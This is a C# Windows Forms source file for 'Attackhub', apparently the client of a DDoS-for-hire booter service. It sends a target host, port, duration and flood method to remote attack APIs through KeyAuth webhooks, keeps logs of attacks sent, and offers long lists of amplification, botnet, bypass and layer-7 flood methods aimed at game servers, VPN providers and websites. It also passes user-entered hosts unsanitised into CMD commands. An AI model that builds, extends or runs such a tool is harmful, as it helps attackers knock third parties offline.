using System;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Net;
using System.IO;
using KeyAuth;
using Newtonsoft.Json.Linq;
using System.Collections.Specialized;
using System.Threading;
using System.Data;
using System.Timers;
using System.Web;
using System.Data.SqlTypes;
using System.Web.UI.WebControls;
using System.Collections.Generic;
using System.Windows.Forms.DataVisualization.Charting;
using System.Net.Http;
using Fusion;

namespace Project_ZOPZZ
{
    public partial class Attackhub : UserControl
    {
        private readonly LogHandler _logHandler = new LogHandler();
        public void Alert(string msg, alirt.enmType type)
        {
            alirt frm = new alirt();
            frm.showAlert(msg, type);
        }
        //json format for url resp
        public static void sendWebHook(string URL, string msg, string username)
        {
            http.Post(URL, new NameValueCollection()
             {
               {
                   "username",
                  username
               },
              {
                 "content",
                   msg
              }
          });
        }
        private async Task SendAttackAsync(string api_id)
        {
            SendAttackBTN.Enabled = false;
            string resp = login.KeyAuthApp.webhook(api_id, $"host={host.Text}&port={port.Text}&time={time.Text}&method={Method.Text}");
            if (login.KeyAuthApp.response.success)
            {
                LogHandler handler = new LogHandler();
                Logs newLog = new Logs
                {
                    Target = host.Text,
                    Port = port.Text,
                    Time = time.Text,
                    Method = Method.Text,
                    DateSent = DateTime.Now.ToString()
                };
                handler.SaveLog(newLog);
                updateLogGrid();
                label10.Text = $"{login.KeyAuthApp.response.message} \nTarget: {host.Text} \nPort: {port.Text} \nTime: {time.Text}\nMethod: {Method.Text} \nDelay: 000.00{api.responseTime}";
                timer1.Interval = 5000; // here time in milliseconds
                timer1.Start();
                SendAttackBTN.Enabled = false;
                SettingsModel settingsModel = SettingsManager.Load();
                SettingsModel settingsModel2 = settingsModel;
                int totalAttacksSent = settingsModel2.Concurrents;
                settingsModel2.Concurrents = totalAttacksSent + 1;
                Cons.Text = settingsModel.Concurrents.ToString();
                timer1.Interval = 5000; // here time in milliseconds
            }
            else
            {
                label10.Text = $"{login.KeyAuthApp.response.message}";
            }
        }
        private void ShowResponse(string type)
        {
            Console.WriteLine($"It took {api.responseTime} ms to {type}");
        }
        private void attacklog()
        {

        }

        public Attackhub()
        {
            InitializeComponent();
        }
        public static void senddiswebhook(string URL, string json)
        {
            var wr = WebRequest.Create(URL);
            wr.ContentType = "application/json";
            wr.Method = "POST";
            using (var sw = new StreamWriter(wr.GetRequestStream()))
                sw.Write(json);
            wr.GetResponse();
        }
        private async Task UpdateMethods(string appid)
        {

        }
        private void label10_Click(object sender, EventArgs e)
        {

        }

        private void label8_Click(object sender, EventArgs e)
        {

        }

        private void label9_Click(object sender, EventArgs e)
        {

        }
        private async void SendAttackBTN_ClickAsync(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(host.Text) || string.IsNullOrWhiteSpace(port.Text) || string.IsNullOrWhiteSpace(time.Text) || string.IsNullOrWhiteSpace(Method.Text)) return;
            switch (server.Text)
            {
                case "HOMEHOLDER":
                    await SendAttackAsync("CTr4lLgVk8");
                    break;

                case "FUNNEL-API":
                    await SendAttackAsync("CTr4lLgVk8");
                    break;

                case "ZOPZ-API":
                    await SendAttackAsync("CTr4lLgVk8");
                    break;

                case "VAC-API":
                    await SendAttackAsync("kWdpWRtgIf");
                    break;

                default:
                    break;
            }
        }

        private void updateLogGrid()
        {
            LogHandler handler = new LogHandler();
            handler.LoadLogsIntoDataGridView(dataGridView1);
        }


        private void ICMPPingBTN_Click(object sender, EventArgs e)
        {
            guna2Panel4.Hide();
            string ping = host.Text;
            {
                Process.Start("CMD.exe", "/k ping " + ping + " -t");
            }
        }

        private void TCPBTn_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(host.Text) || string.IsNullOrWhiteSpace(port.Text)) return;
            string arguments = string.Concat(new string[]
            {
                "/C paping ",
                this.host.Text,
                " -p ",
                this.port.Text,
                " "
            });
            Process.Start("CMD.EXE", arguments); ;
        }

        private void guna2Panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private async void Attackhub_LoadAsync(object sender, EventArgs e)
        {
            login.KeyAuthApp.fetchStats();
            if (server.SelectedItem != null && server.SelectedItem.ToString() == "HOMEHOLDER")
            {
                HOMEHODLER();
            }
            string appvar = login.KeyAuthApp.getvar("cons");
            if (!login.KeyAuthApp.response.success)
            {
                label4.Text = appvar;
            }
            else
                label4.Text = appvar;
            string appvars = login.KeyAuthApp.getvar("Attacktime");
            if (!login.KeyAuthApp.response.success)
            {
                Attacktime.Text = appvars;
            }
            else
                Attacktime.Text = appvars;
            string appvarss = login.KeyAuthApp.var("Methodacount");
            if (!login.KeyAuthApp.response.success)
            {
                label8.Text = appvarss;
            }
            else
                label8.Text = appvarss;
            guna2Panel4.Hide();
            _logHandler.EnsureLogFileExists();
            updateLogGrid();
            SettingsModel settingsModel = SettingsManager.Load();
            user.Text = login.KeyAuthApp.user_data.username;
            Cons.Text = Cons.Text = settingsModel.Concurrents.ToString();
            TopMethodLabel.Text = login.KeyAuthApp.var("BestMethods");
        }
        static string random_string()
        {
            string str = null;

            Random random = new Random();
            for (int i = 0; i < 5; i++)
            {
                str += Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65))).ToString();
            }
            return str;

        }
        private void host_TextChanged(object sender, EventArgs e)
        {

        }

        private void ClearAttackLogs_Click(object sender, EventArgs e)
        {
            Tools.ClearAllAttackLogs();
            this.Alert($"All Attack Logs Are Cleared", alirt.enmType.Success);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            SendAttackBTN.Enabled = true;
            SendAttackBTN.Text = "Send Attack";
            timer1.Stop();
        }

        private void time_TextChanged(object sender, EventArgs e)
        {

        }

        private void method_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void guna2DataGridView2_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }
        private void guna2Panel4_Paint(object sender, PaintEventArgs e)
        {

        }

        private void method_SelectedIndexChanged_1(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void time_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
        }

        private void guna2Button5_Click(object sender, EventArgs e)
        {
 
        }
        private void guna2Button2_Click_1(object sender, EventArgs e)
        {
            Tools.ClearAllAttackLogs();
            dataGridView1.Rows.Clear();
            this.Alert($"All Attack Logs Are Cleared", alirt.enmType.Success);
        }

        private void guna2Panel6_Paint(object sender, PaintEventArgs e)
        {

        }

        private void cons_Click(object sender, EventArgs e)
        {

        }

        private void label7_Click(object sender, EventArgs e)
        {

        }

        private void guna2Panel2_Paint(object sender, PaintEventArgs e)
        {

        }

        private void MethodBox_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button3_Click(object sender, EventArgs e)
        {
;
        }

        private void MethodBox_Click_1(object sender, EventArgs e)
        {

        }

        private void MethodBox_Click_2(object sender, EventArgs e)
        {

        }

        private void label10_Click_1(object sender, EventArgs e)
        {

        }

        private void MethodBox_Click_3(object sender, EventArgs e)
        {

        }

        private void guna2DataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void attackGrid_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void TimeBox_Click(object sender, EventArgs e)
        {

        }

        private void server_SelectedIndexChanged_1(object sender, EventArgs e)
        {

        }

        private void user_Click(object sender, EventArgs e)
        {

        }

        private void PortBox_Click(object sender, EventArgs e)
        {

        }

        private void guna2Panel2_Paint_1(object sender, PaintEventArgs e)
        {

        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void guna2Separator1_Click(object sender, EventArgs e)
        {

        }

        private void Attacktime_Click(object sender, EventArgs e)
        {

        }

        private void dataGridView1_CellContentClick_1(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void MethodBox_TextChanged(object sender, EventArgs e)
        {

        }

        private void MethodBox_Click_4(object sender, EventArgs e)
        {

        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void guna2Panel5_Paint(object sender, PaintEventArgs e)
        {

        }

        private void label13_Click(object sender, EventArgs e)
        {

        }

        private void guna2Separator1_Click_1(object sender, EventArgs e)
        {

        }

        private void TimeBox_TextChanged(object sender, EventArgs e)
        {

        }

        private void openFileDialog1_FileOk(object sender, System.ComponentModel.CancelEventArgs e)
        {

        }

        private void guna2ComboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
        private void TimeBox_Click_1(object sender, EventArgs e)
        {

        }

        private void MethodBox_Click_5(object sender, EventArgs e)
        {

        }

        private void dataGridView1_CellContentClick_2(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void listBox1_SelectedIndexChanged_1(object sender, EventArgs e)
        {

        }

        private void guna2GroupBox1_Click(object sender, EventArgs e)
        {

        }

        private void guna2Panel6_Click(object sender, EventArgs e)
        {

        }

        private void TargetBox_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void TargetBox_TextChanged(object sender, EventArgs e)
        {

        }

        private void guna2DataGridView1_CellContentClick_1(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void timer2_Tick(object sender, EventArgs e)
        {

        }

        private void guna2GroupBox4_Click(object sender, EventArgs e)
        {

        }

        private void host_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            this.Alert("Attack Logs Have Been Cleared", alirt.enmType.Success);
            dataGridView1.Rows.Clear();

        }

        private void Attacktime_Click_1(object sender, EventArgs e)
        {

        }

        private void guna2GroupBox2_Click(object sender, EventArgs e)
        {

        }

        private void guna2GroupBox2_Click_1(object sender, EventArgs e)
        {

        }

        private void guna2Button3_Click_1(object sender, EventArgs e)
        {
            guna2Panel4.Hide();
            if (string.IsNullOrWhiteSpace(host.Text) || string.IsNullOrWhiteSpace(port.Text)) return;
            string arguments = string.Concat(new string[]
            {
                "/C paping ",
                this.host.Text,
                " -p ",
                this.port.Text,
                " "
            });
            Process.Start("CMD.EXE", arguments); ;
        }

        private void label2_Click_1(object sender, EventArgs e)
        {

        }

        private void server_SelectedIndexChanged_2(object sender, EventArgs e)
        {
           
        }

        private void guna2GroupBox3_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button1_Click_1(object sender, EventArgs e)
        {
            guna2Panel4.Show();
        }

        private void server_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (server.Text)
            {
                case "HOMEHOLDER":
                    if (server.SelectedItem != null && server.SelectedItem.ToString() == "HOMEHOLDER")
                    {
                        HOMEHODLER();
                    }
                    string userData = login.KeyAuthApp.getvar("Attacktime");
                    Attacktime.Text = userData;
                    break;

                case "FUNNEL-API":
                    if (server.SelectedItem != null && server.SelectedItem.ToString() == "FUNNEL-API")
                    {
                        funnel();
                    }
                    string userDatav = login.KeyAuthApp.getvar("bypass");
                    Attacktime.Text = userDatav;
                    break;

                case "ZOPZ-API":
                    if (server.SelectedItem != null && server.SelectedItem.ToString() == "ZOPZ-API")
                    {
                        zopzapi();
                    }
                    string userDatavs = login.KeyAuthApp.getvar("bypass");
                    Attacktime.Text = userDatavs;
                    break;

                case "VAC-API":
                    if (server.SelectedItem != null && server.SelectedItem.ToString() == "VAC-API")
                    {
                        VACAPI();
                    }
                    string userDatavss = login.KeyAuthApp.getvar("bypass");
                    Attacktime.Text = userDatavss;
                    break;

                default:
                    break;
            }
        }
        private void HOMEHODLER()
        {
            if (server.SelectedItem != null && server.SelectedItem.ToString() == "HOMEHOLDER")
            {
                Method.Items.Clear();
                Method.Items.Add("(HOMEHOLDER METHODS)");
                Method.Items.Add("ZOPZ-HOLD");
            }
        }
        private void zopzapi()
        {
            if (server.SelectedItem != null && server.SelectedItem.ToString() == "ZOPZ-API")
            {
                Method.Items.Clear();
                Method.Items.Add("(HOME METHODS)");
                Method.Items.Add("ZOPZ-HOLD");
                Method.Items.Add("ZOPZ-HOMEKILL");
                Method.Items.Add("(TCP METHODS)");
                Method.Items.Add("ZOPZ-STD");
                Method.Items.Add("ZOPZ-TCP");
                Method.Items.Add("ZOPZ-TCPKILL");
                Method.Items.Add("ZOPZ-SSHKILL");
                Method.Items.Add("ZOPZ-XMAS");
                Method.Items.Add("(GAME METHODS)");
                Method.Items.Add("ZOPZ-GAME");
                Method.Items.Add("ZOPZ-UDP");
                Method.Items.Add("ZOPZ-APEX");
                Method.Items.Add("ZOPZ-PSN");
                Method.Items.Add("(GAME BYPASS)");
                Method.Items.Add("ZOPZ-VSE");
                Method.Items.Add("(BYPASS METHODS)");
                Method.Items.Add("ZOPZ-CNC");
                Method.Items.Add("ZOPZ-PPS");
                Method.Items.Add("ZOPZ-GUDP");
                Method.Items.Add("ZOPZ-UDPPLAIN");
                Method.Items.Add("(LAYER 7 METHODS)");
                Method.Items.Add("ZOPZ-HTTP");

            }
        }
        private void VACAPI()
        {
            if (server.SelectedItem != null && server.SelectedItem.ToString() == "VAC-API")
            {
                Method.Items.Clear();
                Method.Items.Add("(AMP METHODS)");
                Method.Items.Add("DNS");
                Method.Items.Add("NTP");
                Method.Items.Add("SSDP");
                Method.Items.Add("MIXAMP");
                Method.Items.Add("LDAP");
                Method.Items.Add("(VPN METHODS)");
                Method.Items.Add("OVHTCP");
                Method.Items.Add("OVHBYPASS");
                Method.Items.Add("OPENVPN");
                Method.Items.Add("ROYAL");
                Method.Items.Add("(TCP METHODS)");
                Method.Items.Add("TCPGOD");
                Method.Items.Add("TCPOPTION");
                Method.Items.Add("TFO");
                Method.Items.Add("SYN");
                Method.Items.Add("ACK");
                Method.Items.Add("(GAME METHODS)");
                Method.Items.Add("FORTNITE");
                Method.Items.Add("R6");
                Method.Items.Add("MCPEMCPE");
                Method.Items.Add("UDPRUST");
                Method.Items.Add("ROBLOX");
                Method.Items.Add("UDPGMOD");
                Method.Items.Add("GAMEV2");
                Method.Items.Add("GAMENUKE");
                Method.Items.Add("RAKNET");
                Method.Items.Add("UDPBYPASS");
                Method.Items.Add("(BOTNET METHODS)");
                Method.Items.Add("UDPPPSBOTNET");
                Method.Items.Add("SYNBOTNET");
                Method.Items.Add("UDPBOTNET");
                Method.Items.Add("ACKBOTNET");
                Method.Items.Add("GREBOTNET");
                Method.Items.Add("VSEBOTNET");
                Method.Items.Add("ICMPBOTNET");
                Method.Items.Add("(BYPASS METHODS)");
                Method.Items.Add("HANDSHAKE");
                Method.Items.Add("DISCORD");;
                Method.Items.Add("(GEO BYPASSES");
                Method.Items.Add("TCPREFLECTBR");
                Method.Items.Add("TCPREFLECTCN");
                Method.Items.Add("DNSCN");
                Method.Items.Add("DNSBR");
                Method.Items.Add("DNSPK");
                Method.Items.Add("UDPBR");
                Method.Items.Add("TCPBR");
                Method.Items.Add("FIVEMBR");
                Method.Items.Add("FIVEMPT");
                Method.Items.Add("RUSTBR");
                Method.Items.Add("TS3BR");
                Method.Items.Add("(LAYER 3 METHODS)");
                Method.Items.Add("IPRAND");
                Method.Items.Add("ESP");
                Method.Items.Add("GRE");
                Method.Items.Add("(LAYER 7 METHODS)");
                Method.Items.Add("HTTPPOST");
                Method.Items.Add("HTTPHEAD");
                Method.Items.Add("HTTPPOST");
                Method.Items.Add("HTTPGET");
                Method.Items.Add("HTTPQUERY");
                Method.Items.Add("TLS1");
                Method.Items.Add("TLS2");
                Method.Items.Add("TLS3");

            }
        }
        private void funnel()
        {
            if (server.SelectedItem != null && server.SelectedItem.ToString() == "FUNNEL-API")
            {
                Method.Items.Clear();
                Method.Items.Add("(HOMEHOLDER METHODS)");
                Method.Items.Add("HOME");
                Method.Items.Add("(HOME METHODS)");
                Method.Items.Add("DNS");
                Method.Items.Add("LDAP");
                Method.Items.Add("DNS");
                Method.Items.Add("HOME-KILL");
                Method.Items.Add("LDAPV2");
                Method.Items.Add("(VPN METHODS)");
                Method.Items.Add("OVH");
                Method.Items.Add("NFO");
                Method.Items.Add("OVH-TCP");
                Method.Items.Add("OVH-UDP");
                Method.Items.Add("OPENVPN");
                Method.Items.Add("ROYAL");
                Method.Items.Add("PATH");
                Method.Items.Add("FRANTECH");
                Method.Items.Add("(HOTSPOT METHODS)");
                Method.Items.Add("T-MOBILE");
                Method.Items.Add("HOTSPOT");
                Method.Items.Add("(TCP METHODS)");
                Method.Items.Add("SYN");
                Method.Items.Add("ACK");
                Method.Items.Add("TCP-KILL");
                Method.Items.Add("(GAME METHODS)");
                Method.Items.Add("MINECRAFT");
                Method.Items.Add("FIVEMDIE");
                Method.Items.Add("GAME");
                Method.Items.Add("VALVE");
                Method.Items.Add("RL-LAG");
                Method.Items.Add("R6-RANKED");
                Method.Items.Add("WARZONE-FREEZE");
                Method.Items.Add("PSN-CRASH");
                Method.Items.Add("ROBLOX-FREEZE");
                Method.Items.Add("FORTNITE-LAG");
                Method.Items.Add("APEX-CRASH");
                Method.Items.Add("SPLITGATE-LAG");
                Method.Items.Add("COD-CRASH");
                Method.Items.Add("RUST-LAG");
                Method.Items.Add("CSGO");
                Method.Items.Add("(GAME BYPASS)");
                Method.Items.Add("GAME-ALL");
                Method.Items.Add("UDP-FLOOD");
                Method.Items.Add("VSE");
                Method.Items.Add("GAME-BYPASS");
                Method.Items.Add("(BYPASS METHODS)");
                Method.Items.Add("DISCORD");
                Method.Items.Add("HANDSHAKE");
                Method.Items.Add("TELEGRAM");
                Method.Items.Add("UDPRAW");
                Method.Items.Add("SOCKET");
                Method.Items.Add("SSH");
                Method.Items.Add("SUBNET");
                Method.Items.Add("UDP-BYPASS");
                Method.Items.Add("CNC-BYPASS");
                Method.Items.Add("(LAYER 3 METHODS)");
                Method.Items.Add("IPRAND");
                Method.Items.Add("ESP");
                Method.Items.Add("GRE");
                Method.Items.Add("(LAYER 7 METHODS)");
                Method.Items.Add("TLS");
                Method.Items.Add("TLSV2");
                Method.Items.Add("HTTPS");
                Method.Items.Add("HTTPS-SLAP");
                Method.Items.Add("BROWSER");
                Method.Items.Add("HTTP-UAM");
                Method.Items.Add("HTTP-BYPASS");

            }
        }
        private void method_SelectedIndexChanged_2(object sender, EventArgs e)
        {

        }

        private void guna2Button2_Click_2(object sender, EventArgs e)
        {
            guna2Panel4.Hide();
        }

        private void guna2Button4_Click(object sender, EventArgs e)
        {
            guna2Panel4.Hide();
            this.Alert("Attack Logs Have Been Cleared", alirt.enmType.Success);
            dataGridView1.Rows.Clear();
        }

        private void guna2GroupBox3_Click_1(object sender, EventArgs e)
        {

        }

        private void guna2GroupBox5_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button4_Click_1(object sender, EventArgs e)
        {
            guna2Panel4.Hide();
            string filePath = "logs.json";

            try
            {
                if (File.Exists(filePath))
                {
                    File.Delete(filePath);
                    updateLogGrid();
                    this.Alert("All Attack Logs Have Been Cleared", alirt.enmType.Success);
                }
                else
                {
                    this.Alert("All Attack Failed To Clear", alirt.enmType.Success);
                }
            }
            catch (Exception ex)
            {
                this.Alert($"An error occurred: {ex.Message}", alirt.enmType.Success);
            }
        }

        private void label10_Click_2(object sender, EventArgs e)
        {

        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void guna2Button7_Click(object sender, EventArgs e)
        {

        }

        private void guna2Panel4_Paint_1(object sender, PaintEventArgs e)
        {

        }

        private void guna2Separator1_Click_2(object sender, EventArgs e)
        {


        }

        private void guna2Panel11_Paint(object sender, PaintEventArgs e)
        {

        }

        private void label9_Click_1(object sender, EventArgs e)
        {

        }

        private void label2_Click_2(object sender, EventArgs e)
        {

        }
    }
}